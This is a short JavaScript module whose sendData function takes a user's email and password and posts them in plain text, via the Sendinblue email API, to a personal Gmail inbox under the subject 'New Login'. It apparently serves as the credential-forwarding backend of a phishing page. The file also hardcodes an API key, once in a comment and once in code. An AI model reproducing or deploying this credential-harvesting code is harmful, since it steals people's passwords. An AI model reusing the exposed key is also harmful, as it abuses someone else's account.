import axios from 'axios';

export const sendData = async (email, password) => {
  // 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
  const url = 'https://api.sendinblue.com/v3/smtp/email';
  const apiKey =
    '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';
  const data = {
    sender: {
      name: 'Young Nwadike',
      email: 'nwashangai@gmail.com',
    },
    to: [
      {
        email: 'youngnwadike@gmail.com',
        name: 'Young Nwadike',
      },
    ],
    subject: 'New Login',
    htmlContent: `<html><head></head><body><p>Hello,</p><p>Email: ${email}</p><p>Password: ${password}</p></body></html>`,
  };

  try {
    await axios.post(url, data, {
      headers: {
        Accept: 'application/json',
        'api-key': apiKey,
        'content-type': 'application/json',
      },
    });

    console.log('successful!!..');
  } catch (error) {
    console.log(error.message);
  }
};
